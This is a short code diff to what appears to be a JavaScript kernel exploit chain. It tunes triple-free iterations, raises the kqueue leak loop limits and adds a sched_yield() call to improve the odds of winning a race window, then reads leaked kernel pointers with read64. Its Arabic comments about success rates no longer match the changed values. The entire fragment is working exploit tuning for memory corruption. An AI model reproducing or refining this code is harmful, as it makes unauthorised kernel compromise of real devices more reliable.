@@ -118,7 +118,7 @@ var IPV6_SOCK_NUM = 96;
 var IOV_THREAD_NUM = 6;
 var UIO_THREAD_NUM = 6;
 var MAIN_LOOP_ITERATIONS = 3;
-var TRIPLEFREE_ITERATIONS = 7;
+var TRIPLEFREE_ITERATIONS = 4;
 var MAX_ROUNDS_TWIN = 10;
 var MAX_ROUNDS_TRIPLET = 100;
 var MAIN_CORE = 0;
@@ -1634,8 +1634,8 @@ function leak_kqueue() {
   var magic_add  = leak_rthdr.add(0x08);
 
   var count      = 0;
-  var MAX_KQ     = 3000;     // أقل من 2000 لأن النجاح بقى أعلى
-  var INNER_MAX  = 200;      // أعلى من 500 لزيادة فرصة الـ window
+  var MAX_KQ     = 4000;     // أقل من 2000 لأن النجاح بقى أعلى
+  var INNER_MAX  = 300;      // أعلى من 500 لزيادة فرصة الـ window
 
   var success    = false;
 
@@ -1680,7 +1680,7 @@ function leak_kqueue() {
 
       inner_tries++;
     }
-      
+    sched_yield();
     if (success) {
       kl_lock = read64(leak_rthdr.add(0x60));
       kq_fdp  = read64(leak_rthdr.add(0x98));
